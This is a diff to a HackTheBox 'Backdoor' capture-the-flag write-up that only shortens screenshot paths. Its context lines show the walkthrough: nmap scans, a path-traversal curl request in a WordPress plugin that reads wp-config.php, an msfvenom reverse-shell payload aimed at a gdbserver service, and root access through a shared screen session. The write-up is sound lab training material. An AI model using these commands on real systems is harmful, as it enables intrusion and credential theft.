@@ -42,7 +42,7 @@ Check if the host is reachable:
 ping -c 1 10.10.11.125
 ```
 
-![ping](GitHubv2/HackTheBox/EASY/Backdoor/screenshots/ping.png)
+![ping](screenshots/ping.png)
 
 The machine responds, confirming it is alive.
 
@@ -56,11 +56,11 @@ Scan all TCP ports:
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.125 -oG allPorts
 ```
 
-![allports](GitHubv2/HackTheBox/EASY/Backdoor/screenshots/allports.png)
+![allports](screenshots/allports.png)
 
 Extract open ports:
 
-![extractports](GitHubv2/HackTheBox/EASY/Backdoor/screenshots/extractports.png)
+![extractports](screenshots/extractports.png)
 
 ---
 
@@ -72,7 +72,7 @@ Perform a deeper scan on the identified open ports:
 nmap -sCV -p22,80,1337 10.10.11.125 -oN targeted
 ```
 
-![targeted](GitHubv2/HackTheBox/EASY/Backdoor/screenshots/targeted.png)
+![targeted](screenshots/targeted.png)
 
 Open ports:
 
@@ -100,11 +100,11 @@ whatweb http://10.10.11.125
 
 Detected **WordPress 5.8.1**.
 
-![whatweb](GitHubv2/HackTheBox/EASY/Backdoor/screenshots/whatweb.png)
+![whatweb](screenshots/whatweb.png)
 
 Visiting the site:
 
-![web](GitHubv2/HackTheBox/EASY/Backdoor/screenshots/web.png)
+![web](screenshots/web.png)
 
 The homepage is a default WordPress theme with minimal content.
 
@@ -116,7 +116,7 @@ Attempt to access the default login endpoint:
 http://10.10.11.125/wp-login.php
 ```
 
-![wp_login](GitHubv2/HackTheBox/EASY/Backdoor/screenshots/wp_login.png)
+![wp_login](screenshots/wp_login.png)
 
 Default credentials failed.
 
@@ -131,7 +131,7 @@ Here, the file is missing, allowing us to browse the directory:
 http://10.10.11.125/wp-content/plugins/
 ```
 
-![wp_plugins](GitHubv2/HackTheBox/EASY/Backdoor/screenshots/wp_plugins.png)
+![wp_plugins](screenshots/wp_plugins.png)
 
 Two plugins found:
 
@@ -148,7 +148,7 @@ Search for known exploits:
 searchsploit ebook download
 ```
 
-![sploit_ebook](GitHubv2/HackTheBox/EASY/Backdoor/screenshots/sploit_ebook.png)
+![sploit_ebook](screenshots/sploit_ebook.png)
 
 Exploit details:
 
@@ -164,7 +164,7 @@ Retrieve `wp-config.php`:
 curl -s -X GET "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php"
 ```
 
-![curl_get](GitHubv2/HackTheBox/EASY/Backdoor/screenshots/curl_get.png)
+![curl_get](screenshots/curl_get.png)
 
 Database credentials found but not directly useful.
 
@@ -233,7 +233,7 @@ Filtering results reveals:
 
 Search for exploits:
 
-![sploit_gdbserver](GitHubv2/HackTheBox/EASY/Backdoor/screenshots/sploit_gdbserver.png)
+![sploit_gdbserver](screenshots/sploit_gdbserver.png)
 
 Download exploit:
 
@@ -249,7 +249,7 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.7 LPORT=443 PrependFork=t
 
 Run exploit and connect, obtaining a shell as `user`.
 
-![user_flag](GitHubv2/HackTheBox/EASY/Backdoor/screenshots/user_flag.png)
+![user_flag](screenshots/user_flag.png)
 
 ✅ **User flag obtained**
 
@@ -265,7 +265,7 @@ List running processes:
 ps -faux | grep screen
 ```
 
-![screen_executing](GitHubv2/HackTheBox/EASY/Backdoor/screenshots/screen_executing.png)
+![screen_executing](screenshots/screen_executing.png)
 
 Found:
 
@@ -299,7 +299,7 @@ Attach to root session:
 TERM=xterm screen -x root/
 ```
 
-![root_flag](GitHubv2/HackTheBox/EASY/Backdoor/screenshots/root_flag.png)
+![root_flag](screenshots/root_flag.png)
 
 ✅ **Root flag obtained**
 
